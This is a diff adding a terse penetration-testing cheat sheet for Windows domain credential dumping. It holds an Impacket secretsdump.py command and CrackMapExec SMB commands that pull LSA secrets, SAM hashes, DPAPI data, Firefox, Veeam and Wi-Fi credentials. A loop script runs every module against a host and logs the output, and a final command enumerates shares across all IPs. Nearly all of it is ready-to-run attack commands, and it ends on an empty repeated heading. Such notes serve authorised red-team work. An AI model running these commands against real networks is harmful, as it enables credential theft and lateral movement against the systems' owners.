@@ -1,1 +1,26 @@
+======================
+secretsdump.py
+======================
+>>$ secretsdump.py domain.com/user@admin-ip
 
+======================
+crackmap smb modules
+======================
+>>$ cme smb ip -d domain.com -u user -p 'pass' --lsa
+>>$ cme smb ip -d domain.com -u user -p 'pass' --sam
+>>$ cme smb ip -d domain.com -u user -p 'pass' --dpapi
+>>$ cme smb ip -d domain.com -u user -p 'pass' --firefox
+>>$ cme smb ip -d domain.com -u user -p 'pass' --veeam
+>>$ cme smb ip -d domain.com -u user -p 'pass' --wifi
+
+script
+>>>>
+    echo "lsa\r\nsam\r\ndpapi\r\nfirefox\r\nveeam\r\nwifi" >> cme-modules.txt
+    for i in $(cat cme-modules.txt); do cme smb ip -d domain.com -u user -p 'pass' --$i --log host-$i.log; done
+>>>>
+
+>>$ cme smb all-ips -d domain.com -u user -p 'pass' --shares --log shares.log
+
+======================
+crackmap smb modules
+======================
